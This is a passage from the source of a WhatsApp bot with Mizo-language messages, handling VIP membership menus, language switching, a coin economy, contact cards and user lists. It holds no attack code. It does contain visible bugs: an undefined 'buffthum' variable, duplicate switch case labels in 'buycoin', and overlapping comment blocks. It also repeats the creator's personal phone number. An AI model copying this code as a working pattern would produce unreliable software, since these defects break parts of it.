                        description: "Free",
                        id: `${prefix}`+`hb2ab95`
                      },
                      {
                        title: "10 days VIP Membership",
                        description: `${englovip3}`,
                        id: `${prefix}`+`myid1`
                      },
                      {
                        title: "20 days VIP Membership",
                        id: `${prefix}`+`myid2`,
                        description: `${englovip4}`,
                      },
                      {
                        title: "1 Month VIP Membership",
                        id: `${prefix}`+`myid3`,
                        description: `${englovip5}`
                      },
                      {
                        title: "2 Month VIP Membership",
                        id: `${prefix}`+`myid4`,
                        description: `${englovip6}`
                      }
                    ]
                  },
                  {
                    title: "Best Offer",
                    highlight_label: "Best",
                    rows: [
                      {
                        title: "1Year VIP Membership",
                        description: `${englovip7}`,
                        id: `${prefix}`+`myid5`
                      }
                    ]
                  }
                ]
              })
            }
          ]
        })
      })
    }
  }
}, {quoted: m});

HBWABotMz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
        return;
    }
    await dodoi("Private Chat-ah VIP Plan i en theih turin ka rawn thawn e")
    if (isBusiness) {
        HBWABotMz.sendMessage(m.chat, { image: {url: buyvipthumb}, caption: `*👑 ${botname}*
*To Become VIP Membership, please follow these steps!!👑*
'*Note :* To become a VIP member, you need to pay a fee. Before paying, you must review one requirement. See our plan then choose your preferred option by typing the command key like as i provide in the square bracket,
'10days': '₹20', [ myid1 ]
'20days': '₹40', [ myid2 ]
'1month': '₹50', [ myid3 ]
'2month': '₹100', [ myid4 ]
'1year: ~₹600,~ [ myid5 ] ₹500✓ 2month free'`}, { quoted: m });
       return
       }
     let msg2 = generateWAMessageFromContent(m.sender, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: ''
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: 'GPay : 8416093656'
        }),
        header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : {url : img}}, { upload: HBWABotMz.waUploadToServer})), 
                  title: `*👑 ${botname}*
${englovip8}`,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "VIEW PLAN",
                sections: [
                  {
                    title: "I DUH BER SELECT RAWH",
                    rows: [
                      {
                        title: "10 days VIP Membership",
                        description: `${englovip3}`,
                        id: `${prefix}`+`myid1`
                      },
                      {
                        title: "20 days VIP Membership",
                        id: `${prefix}`+`myid2`,
                        description: `${englovip4}`,
                      },
                      {
                        title: "1 Month VIP Membership",
                        id: `${prefix}`+`myid3`,
                        description: `${englovip5}`
                      },
                      {
                        title: "2 Month VIP Membership",
                        id: `${prefix}`+`myid4`,
                        description: `${englovip6}`
                      }
                    ]
                  },
                  {
                    title: "Best Offer",
                    highlight_label: "Best",
                    rows: [
                      {
                        title: "1Year VIP Membership",
                        description: `${englovip7}`,
                        id: `${prefix}`+`myid5`
                      }
                    ]
                  }
                ]
              })
            }
          ]
        })
      })
    }
  }
}, {quoted: m});

HBWABotMz.relayMessage(msg2.key.remoteJid, msg2.message, {
  messageId: msg2.key.id
});
}
break;

case  'mtl':
  if (!HerbertTheCreator2) return dodoi(mess.owner)
  if (args.length < 1) return dodoi(`Launguage thlak i duh chuan code nen rawn dah rawh\n*⟨Etirnan:* ${prefix + command} en`)
  const thelung = ["pt-BR", "en", "id", "ru", "lus", "de", "hi"];
  if (args[0] === 'lus' || args[0] === 'default') {
    global.default_language = true;
    global.mtl_language = false;
    global.bot_language = args[0];
    dodoi(`Defualt a dah a ni✓`)
  } else if (!thelung.includes(args[0])) {
    dodoi("I language code rawn provide hi a code a dik lo")
  } else {
    global.default_language = false;
    global.mtl_language = true;
    global.bot_language = args[0];
    dodoi(`Tawng hman chu thlak a ni!..`)
  }
  break;
case 'changelang': {
if (!HerbertTheCreator2) return dodoi(mess.owner)
 if (isBusiness) {
if (args.length < 1) return dodoi(`Launguage thlak i duh chuan code nen rawn dah rawh\n*⟨Etirnan:* ${prefix + command} en`)
  const thelung = ["pt-BR", "en", "id", "ru", "lus", "de", "hi"];
  if (args[0] === 'lus' || args[0] === 'default') {
    global.default_language = true;
    global.mtl_language = false;
    global.bot_language = args[0];
    dodoi(`Defualt a dah a ni✓`)
  } else if (!thelung.includes(args[0])) {
    dodoi("I language code rawn provide hi a code a dik lo")
  } else {
    global.default_language = false;
    global.mtl_language = true;
    global.bot_language = args[0];
    dodoi(`Tawng hman chu thlak a ni!..`)
  }
return
 }
let msg2 = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: ''
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: ''
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          title: `Change The Language`,
          subtitle: '',
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "Language",
                sections: [
                {
                    title: "Choos The Option",
                    highlight_label: "Default",
                    rows: [
                      {
                        title: "Mizo",
                        description: `Ṭawng`,
                        id: `${prefix}`+`mtl lus`
                      }
                    ]
                  },
                  {
                    title: "Other Language Using Google Translate",
                    rows: [
                      {
                        title: "English",
                        description: `Language`,
                        id: `${prefix}`+`mtl en`
                      },
                      {
                        title: "Russian",
                        id: `${prefix}`+`mtl ru`,
                        description: `Language`,
                      },
                      {
                        title: "Indonesian",
                        id: `${prefix}`+`mtl id`,
                        description: `Language`
                      },
                      {
                        title: "Hindi",
                        id: `${prefix}`+`mtl hi`,
                        description: `Language`
                      },
                      {
                        title: "Germany",
                        id: `${prefix}`+`mtl de`,
                        description: `Language`
                      }
                    ]
                  }
                ]
              })
            }
          ]
        })
      })
    }
  }
}, {quoted: m});

HBWABotMz.relayMessage(msg2.key.remoteJid, msg2.message, {
  messageId: msg2.key.id
});
}
break

case 'gtrial': {
if (!HerbertTheCreator1) return 
const freevip = "frvip2";
const ckfrvip1 = "ckfrvip3";
    let commandParams = text.trim().split(" ")
    if (commandParams[0] === "") return dodoi(`*Entirnan* : ${prefix + command} 100 @user`)
    const target =
        m.quoted && m.mentionedJid.length === 0
            ? m.quoted.sender
            : m.mentionedJid[0] || null;
    if (!target || target === m.sender) return dodoi("Engtia tih nge i tum")
    if (m.quoted?.sender && !m.mentionedJid.includes(m.quoted.sender)) m.mentionedJid.push(m.quoted.sender)
    while (m.mentionedJid.length < 2) m.mentionedJid.push(m.sender)
    const recipient = target;
    const amount = commandParams[0];
    const code = commandParams[1];
    let requestedAmount = parseInt(amount)
    if (!requestedAmount) return dodoi("I thil ziah khi check teh, command i hmang dik lo a ni mai thei")
    const balance = await eco.balance(limitneihtu, freevip)
    let insufficientFunds = (balance.wallet) < requestedAmount;
    if (insufficientFunds) return await eco.give(limitneihtu, freevip, 10);
    const give = await eco.give(recipient, freevip, requestedAmount)
    dodoi(`Free trial ${requestedAmount} chu pek fel a ni ta ✓`)
}
break;
case 'may15': {
if (!HerbertTheCreator1) return 
if (!text) return
let user = m.sender
const cara = "cara" 
if (args[0] == 'c') {
const thlakp = `${text.replace(/c |C /g, '')}`;
const daily4 = await eco.give(user, cara, thlakp)
 await dodoi(`Coin 🪙 ${thlakp} i wallet ah dah a ni🫠 myinfo tih rawn thawn la i Coin neih zat i en thei ang`)
}
}
break

case 'myinfo': {
    if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender);  
    const user = m.sender;
    const freevip = "frvip2";
    const cara = "cara";
    const balance = await eco.balance(user, cara);
    const balance3 = await eco.balance(limitneihtu, freevip);
   // const nonetitle = await fs.readFileSync('./asset/image/info.png');
    // Fetch title thumbnails
    const titleThumbRaw = "https://raw.githubusercontent.com/HBMods-OFC/Vawk/refs/heads/master/title.json";
    const titleThumbData = await fetch(titleThumbRaw).then(res => res.json()).catch(() => null);
    if (!titleThumbData) {
    throw new Error("Failed to fetch title thumbnails.");
    }
    const nonetitle = titleThumbData.nonett || "";
    const thumbnails = {
    "Elite": titleThumbData.elite,
    "Master": titleThumbData.master,
    "Grand-Master": titleThumbData.gmaster,
    "Epic": titleThumbData.epic,
    "Lord": titleThumbData.lord,
    "Mythical": titleThumbData.mythical
     };
    const userTitle = await getUserTitle(user);
    const thumbnail = thumbnails[userTitle.split(" ")[0]] || nonetitle;
    const buffThum = await getBuffer(thumbnail);
    let memberId = null;
    let expiredDate = null;
    vipmem.concat(vipmem2).some((member) => {
        if (member.id === user) {
            memberId = member.id;
            expiredDate = member.expired;
            return true;
        }
        return false;
    });
    let memberId2 = null;
    let expiredDate2 = null;
    premium.some((member) => {
        if (member.id === user) {
            memberId2 = member.id;
            expiredDate2 = member.expired;
            return true;
        }
        return false;
    });
    if (!isVip) {
    HBWABotMz.sendMessage(from, { react: { text: "💫" , key: m.key }}) 
        return HBWABotMz.sendMessage(from, {
            video: typeof thumbnail === 'string' && thumbnail.startsWith('http') ? { url: thumbnail } : buffthum,
            caption: `> 𝗜𝗡𝗙𝗢 𝗕𝗬 *${pushname}*
> 🎖️𝗧𝗶𝘁𝗹𝗲: ${userTitle}
> 🪙 𝗖𝗼𝗶𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: ${balance.wallet}
> 🔰 𝗣𝗿𝗲𝗺𝗶𝘂𝗺: 🔴 Not Active
> 👑 𝗩𝗜𝗣 𝗦𝘁𝗮𝘁𝘂𝘀: 🔴 Not Active 
> ⏳ 𝗩𝗜𝗣 𝗧𝗿𝗶𝗮𝗹: ${balance3.wallet} left`, gifPlayback: true
        }, { quoted: m });
    }
if (isPrem) {
    HBWABotMz.sendMessage(from, { react: { text: "🔰", key: m.key } });
    const premExpireMessage = isPremExp ? "Expired" : `${expiredDate2}`;
    const vipExpireMessage = isVip ? `> 🕡 𝗩𝗜𝗣 𝗘𝘅𝗽𝗶𝗿𝘆: ` + (isExp ? "Expired" : `${expiredDate}`) : "";
    const caption = `> 𝗜𝗡𝗙𝗢 𝗕𝗬 *${pushname}*\n` +
        `> 🎖️𝗧𝗶𝘁𝗹𝗲: ${userTitle}\n` +
        `> 🪙 𝗖𝗼𝗶𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: ${balance.wallet}\n` +
        `> 🔰 𝗣𝗿𝗲𝗺𝗶𝘂𝗺: 🔵 Active\n` +
        `> 👑 𝗩𝗜𝗣 𝗦𝘁𝗮𝘁𝘂𝘀: ${aActiveEm}\n` +
        `> 🕡 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗘𝘅𝗽𝗶𝗿𝘆: ${premExpireMessage}\n` +
        (vipExpireMessage ? `${vipExpireMessage}` : "");
    return HBWABotMz.sendMessage(
        from,
        {
            video: typeof thumbnail === 'string' && thumbnail.startsWith('http') ? { url: thumbnail } : buffthum,
            caption: caption,
            gifPlayback: true
        },
        { quoted: m }
    );
}
    HBWABotMz.sendMessage(from, { react: { text: "👑" , key: m.key }}) 
    await HBWABotMz.sendMessage(from, {
       video: typeof thumbnail === 'string' && thumbnail.startsWith('http') ? { url: thumbnail } : buffthum,
        caption: `> 𝗜𝗡𝗙𝗢 𝗕𝗬 *${pushname}*
> 🎖️𝗧𝗶𝘁𝗹𝗲: ${userTitle}
> 🪙 𝗖𝗼𝗶𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: ${balance.wallet}
> 👑 𝗩𝗜𝗣 𝗦𝘁𝗮𝘁𝘂𝘀: 🟢 Active
> 🕡 𝗩𝗜𝗣 𝗘𝘅𝗽𝗶𝗿𝘆: ` + (isExp ? "Expired" : `${expiredDate}`), gifPlayback: true 
    }, { quoted: m });
}
break;

case 'cpt' :{
const user = m.sender;
const titlec = "title";
const balance22 = await eco.balance(user, titlec);
await dodoi(`Hello ${pushname} I title point zat:\n\n_🪙 ${balance22.wallet}_`)
}
break

case 'cpl' :{
const user = m.sender;
const titlec = "diamond";
const balance22 = await eco.balance(user, titlec);
await dodoi(`Hello ${pushname} I limit zat:\n\n_💎 ${balance22.wallet}_`)
}
break

/*
case 'title-upgrade': {
    HBWABotMz.sendMessage(from, { react: { text: "🎖️", key: m.key } });
    const user = m.sender;
    const cara = "cara";
    const titlec = "title";
    const balance = await eco.balance(user, cara);
    const balance22 = await eco.balance(user, titlec);
    const titles = [
        { name: "Fresher", cost: 0 },
        { name: "Elite", cost: 10000 },
        { name: "Master", cost: 100000 },
        { name: "Grand-Master", cost: 200000 },
        { name: "Epic", cost: 300000 },
        { name: "Lord", cost: 450000 },
        { name: "Mythical", cost: 600000 }
    ];
    const currentTitleName = await getUserTitle(user);
    const currentTitleIndex = titles.findIndex(title => title.name === currentTitleName);
    const nextTitle = titles[currentTitleIndex + 1];
    if (!nextTitle) {
        return await HBWABotMz.sendMessage(from,{image: {url: approthumb}, caption: `🎖️Title sang ber i nei tawh a: "Mythical". Upgrade dang a awm tawh lo.\nVip lifetime member i la nih loh chuan vipapplication tih min rawn thawn rawh`, mentions: [m.sender], footer: botname, buttons: [{ buttonId: `${prefix}` +"vipapplication", buttonText: { displayText: "Application" }}],viewOnce: true, headerType: 6,}, {quoted:m})
    }
    if (balance.wallet < nextTitle.cost) {
        return dodoi(`*🚫 "${nextTitle.name}"* title-a upgrade tur chuan coin ${nextTitle.cost} tal i mamawh a ni.`);
    }
    await eco.deduct(user, cara, nextTitle.cost);
    await eco.give(user, titlec, nextTitle.cost);
    await dodoi(`🎉 Kan lawmpui che! *"${nextTitle.name}"* ah i upgrade tawh. I title thar chu "myinfo" hmangin check rawh.`);
}
break;

case 'title': 
if (text === 'upgrade') {
    HBWABotMz.sendMessage(from, { react: { text: "🎖️", key: m.key } });
    const user = m.sender;
    const cara = "cara";
    const titlec = "title";
    const balance = await eco.balance(user, cara);
    const balance22 = await eco.balance(user, titlec);
    const titles = [
        { name: "Fresher", cost: 0 },
        { name: "Elite", cost: 10000 },
        { name: "Master", cost: 100000 },
        { name: "Grand-Master", cost: 200000 },
        { name: "Epic", cost: 300000 },
        { name: "Lord", cost: 450000 },
        { name: "Mythical", cost: 600000 }
    ];
    const currentTitleName = await getUserTitle(user);
    const currentTitleIndex = titles.findIndex(title => title.name === currentTitleName);
    const nextTitle = titles[currentTitleIndex + 1];
    if (!nextTitle) {
        return await HBWABotMz.sendMessage(from,{image: {url: approthumb}, caption: `🎖️Title sang ber i nei tawh a: "Mythical". Upgrade dang a awm tawh lo.\nVip lifetime member i la nih loh chuan vipapplication tih min rawn thawn rawh`, mentions: [m.sender], footer: botname, buttons: [{ buttonId: `${prefix}` +"vipapplication", buttonText: { displayText: "Application" }}],viewOnce: true, headerType: 6,}, {quoted:m})
    }
    if (balance.wallet < nextTitle.cost) {
        return dodoi(`*🚫 "${nextTitle.name}"* title-a upgrade tur chuan coin ${nextTitle.cost} tal i mamawh a ni.`);
    }
    await eco.deduct(user, cara, nextTitle.cost);
    await eco.give(user, titlec, nextTitle.cost);
    await dodoi(`🎉 Kan lawmpui che! *"${nextTitle.name}"* ah i upgrade tawh. I title thar chu "myinfo" hmangin check rawh.`);
}
break;
/*
case 'mlimit': case 'glimit': case 'limitg': {
    let commandParams = text.trim().split(" ")
    if (commandParams[0] === "") return dodoi(`i limit hi midang sem ve i duh chuan, tag rawh. Tiang hian hman tur a ni\n*Entirnan* : ${prefix + command} 100 @user`)
if (text == 'rules') return dodoi(`*${command} hi kan 🪙 Limit-te mi dang kan pek theihna tura siam a ni a, hetah hian dan kan nei ve a ni!! chung kan dante chu\n\n*1:* ${prefix + command} tih hi i hmang anga chuan i pek duh zat, i rawn dah tel anga tichuan i pek duh chu i tag tel leh ang!...\n*Entirnan:* ${prefix + command} 100 @user\n\n*2:* I Limit hi midang i pe a nih chuan i Limit neih zat a tangin 10 cut tel zel a ni ang\n\n*3:* Entirnan Limit 1 midang i pe a nih pawn 10 cut tel zel a ni anga, chutiang bawkin 100 i pe a nih pawhin Limit 10 tho a in cut ang\n😇😇`)
    const target =
        m.quoted && m.mentionedJid.length === 0
            ? m.quoted.sender
            : m.mentionedJid[0] || null;
    if (!target || target === m.sender) return dodoi("Engtia tih nge i tum")
    if (m.quoted?.sender && !m.mentionedJid.includes(m.quoted.sender)) m.mentionedJid.push(m.quoted.sender)
    while (m.mentionedJid.length < 2) m.mentionedJid.push(m.sender)
    const recipient = target;
    const amount = commandParams[0];
    const code = commandParams[1];
    let requestedAmount = parseInt(amount)
    if (!requestedAmount) return dodoi("I thil ziah khi check teh, command i hmang dik lo a ni mai thei")
    const balance = await eco.balance(limitneihtu, kancoins)
    let insufficientFunds = (balance.wallet) < requestedAmount;
    if (insufficientFunds) return dodoi("Chu tiang zat chu 🪙Limit i nei lo")
    const deduct = await eco.deduct(limitneihtu, kancoins, requestedAmount)
    const adminDeduct = await eco.deduct(limitneihtu, kancoins, 10)
    const give = await eco.give(recipient, kancoins, requestedAmount)
    dodoi(`🪙Limit ${requestedAmount} chu pek fel a ni ta ✓,\n 
I Limit hi midang i pek a vangin, 🪙10 ka cut tel sak che a ni!!😇 rules i en duh chuan *${prefix + command} rules* tih rawn type rawh`)
}
break;
*/
case 'buycoin': {
HBWABotMz.sendMessage(from, { react: { text: "💲" , key: m.key }})
if (!text) return dodoi(`💎Coin Store💎\n1. 💎 100 = 🪙50\n2. 💎 200 = 🪙100\n3. 💎 300 = 🪙150\n4. 💎 400 = 🪙200\n5. 💎 500 = 🪙250\n6. 💎 600 = 🪙300\n7. 💎 700 = 🪙350\n8. 💎 800 = 🪙400\n9. 💎 900 = 🪙450\n10. 💎 1000 = 🪙500\n\n_Option a number (1,2,3) khi choose tur a ni, hman dan tur chu_
*Entirnan:* ${prefix}buycoin 5\n`)
if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)
const user = m.mentionedJid[0] ? m.mentionedJid[0] : m.sender
const cara = "diamond"
let value = text.trim()
let k = parseInt(value)
if (!k) return dodoi("I thil ziah khi check teh, command i hmang dik lo a ni mai thei")
const balance = await eco.balance(user, cara) 
switch (value) {
case '1': case '100': case '50':
if (100 > balance.wallet ) return dodoi(`🪙coin 50 limit 💎 nen exchange i duh chuan limit hi  💎 100(za) i neih a ngai`)
const deduct1 = await eco.deduct(user, cara, 100)
const add1 = eco.give(limitneihtu, kancoins, 50) 
await dodoi(`You have purchased successfully 🪙50 coin `)
break
case '2': case '200': case '100':
if (200 > balance.wallet ) return dodoi(`🪙coin 100 limit 💎 nen exchange i duh chuan limit hi  💎 200(zahnih) i neih a ngai`)
const deduct2 = await eco.deduct(user, cara, 200)
const add2 = eco.give(limitneihtu, kancoins, 100) 
await dodoi(`You have purchased successfully 🪙100 coin `)
break
case '3': case '300': case '150':
if (300 > balance.wallet ) return dodoi(`🪙coin 150 limit 💎 nen exchange i duh chuan limit hi  💎 300(zathum) i neih a ngai`)
const deduct3 = await eco.deduct(user, cara, 300)
const add3 = eco.give(limitneihtu, kancoins, 150) 
await dodoi(`You have purchased successfully 🪙150 coin `)
break
case '4': case '400': case '200':
if (400 > balance.wallet ) return dodoi(`🪙coin 200 limit 💎 nen exchange i duh chuan limit hi  💎 400(zali) i neih a ngai`)
const deduct4 = await eco.deduct(user, cara, 400)
const add4 = eco.give(limitneihtu, kancoins, 200) 
await dodoi(`You have purchased successfully 🪙200 coin `)
break
case '5': case '500': case '250': 
if (500 > balance.wallet ) return dodoi(`🪙coin 250 limit 💎 nen exchange i duh chuan limit hi  💎 500(zanga) i neih a ngai`)
const deduct5 = await eco.deduct(user, cara, 500)
const add5 = eco.give(limitneihtu, kancoins, 250) 
await dodoi(`You have purchased successfully 🪙250 coin `)
break
case '6': case '600': case '300': 
if (600 > balance.wallet ) return dodoi(`🪙coin 300 limit 💎 nen exchange i duh chuan limit hi  💎 600(zaruk) i neih a ngai`)
const deduct6 = await eco.deduct(user, cara, 600)
const add6 = eco.give(limitneihtu, kancoins, 300) 
await dodoi(`You have purchased successfully 🪙300 coin `)
break
case '7': case '700': case '350': 
if (700 > balance.wallet ) return dodoi(`🪙coin 350 limit 💎 nen exchange i duh chuan limit hi  💎 700(zasarih) i neih a ngai`)
const deduct7 = await eco.deduct(user, cara, 700)
const add7 = eco.give(limitneihtu, kancoins, 350) 
await dodoi(`You have purchased successfully 🪙350 coin `)
break
case '8': case '800': case '400': 
if (800 > balance.wallet ) return dodoi(`🪙coin 400 limit 💎 nen exchange i duh chuan limit hi  💎 800(zariat) i neih a ngai`)
const deduct8 = await eco.deduct(user, cara, 800)
const add8 = eco.give(limitneihtu, kancoins, 400) 
await dodoi(`You have purchased successfully 🪙400 coin `)
break
case '9': case '900': case '450': 
if (900 > balance.wallet ) return dodoi(`🪙coin 450 limit 💎 nen exchange i duh chuan limit hi  💎 900(zakua) i neih a ngai`)
const deduct9 = await eco.deduct(user, cara, 900)
const add9 = eco.give(limitneihtu, kancoins, 450) 
await dodoi(`You have purchased successfully 🪙450 coin `)
break
case '10': case '1000': case '500': 
if (1000 > balance.wallet ) return dodoi(`🪙coin 500 limit 💎 nen exchange i duh chuan limit hi  💎 1000(sangkhat) i neih a ngai`)
const deduct10 = await eco.deduct(user, cara, 1000)
const add10 = eco.give(limitneihtu, kancoins, 500) 
await dodoi(`You have purchased successfully 🪙500 coin `)
break
}
}
break
case 'owner': {
    let userList = [...new Set([...global.conns.filter(HBWABotMz => HBWABotMz.user).map(HBWABotMz => HBWABotMz.user)])];
    let ownerNumbers = Array.isArray(global.ownernumber) ? global.ownernumber : [global.ownernumber]; 
    let contacts = [];
    let te = "*List of ToBeBot Users & Owners*\n\n";

    if (userList.length > 0) {
        for (let user of userList) {
            let jid2 = await HBWABotMz.decodeJid(user.id);
            let userName = await HBWABotMz.getName(jid2) || "Unknown User";
            let number = jid2.split("@")[0];

            te += `😇 Name: ${userName}\n`
            te += `👑 Contact: @${number}\n\n`

            contacts.push({
                displayName: userName,
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${userName}\nFN:${userName}\n`
                     + `item1.TEL;waid=${number}:${number}\nitem1.X-ABLabel: Tobebot User\n`
                     + `END:VCARD`
            });
        }
    } else {
        te = "*No ToBeBot users found. Showing Owner Contacts:*\n\n";
    }
    for (let number of ownerNumbers) {
        let ownerName = await HBWABotMz.getName(number + "@s.whatsapp.net") || "Bot Owner";
        te += `👑 Owner: ${ownerName}\n`
        te += `📞 Contact: @${number}\n\n`
        contacts.push({
            displayName: ownerName,
            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${ownerName}\nFN:${ownerName}\n`
                 + `item1.TEL;waid=${number}:${number}\nitem1.X-ABLabel:Bot Owner\n`
                 + `item2.EMAIL;type=INTERNET:HBMods OFC\nitem2.X-ABLabel:YouTube\n`
                 + `item3.URL:https://herbert70.blogspot.com\nitem3.X-ABLabel:IG\n`
                 + `item4.ADR:;;;${location};;\nitem4.X-ABLabel:Region\n`
                 + `END:VCARD`
        });
    }

    await HBWABotMz.sendMessage(from, {
        contacts: { 
            displayName: `${contacts.length} Contacts`, 
            contacts 
        },
        mentions: await HBWABotMz.parseMention(te) 
    }, { quoted: m });
}
break;

case 'dev': case 'creator': {
let luz = []
let khm = "918416093656@s.whatsapp.net"
luz.push({displayName: await HBWABotMz.getName(khm),
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await HBWABotMz.getName(918416093656 + "@s.whatsapp.net"
)}\nFN:Herbert Suantak\nitem1.TEL;waid=918416093656:918416093656\nitem1.X-ABLabel: Bot Creator\nitem2.EMAIL;type=INTERNET:HBMods OFC\nitem2.X-ABLabel:YouTube\nitem3.URL:https://herbert70.blogspot.com\nitem3.X-ABLabel:IG\nitem4.ADR:;;Inda;Mizoram Aizawl;;\nitem4.X-ABLabel:Region\nEND:VCARD`
})
await HBWABotMz.sendMessage(from, {
contacts: { 
displayName: `${luz.length} Contact`, 
contacts: luz }, mentions: [sender] }, { quoted: m })
}
break
case 'listvip': {
const array = [];
vipmem.forEach((member) => {
const jsonData = {
hming : member.name,
id: member.id,
expiry: member.expired
};
array.push(jsonData)
})
let teks = `「 *👑VIP Member List 👑* 」\n\n`;
for (let i of array){
y = await (i.id)
teks += `╭═══════════┈\n`
teks += `┃♕ Phone: @${y.split("@")[0]}\n┃♕ Exp: ${i.expiry}\n╰════════════──┈\n`
}
 await HBWABotMz.sendMessage(from,{text:teks ,mentions: await HBWABotMz.parseMention(teks), },{quoted:m})
 }
break;
case 'blacklist': {
  let teks = "「 *Bot hmang thei lo tur list* 」\n\n͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏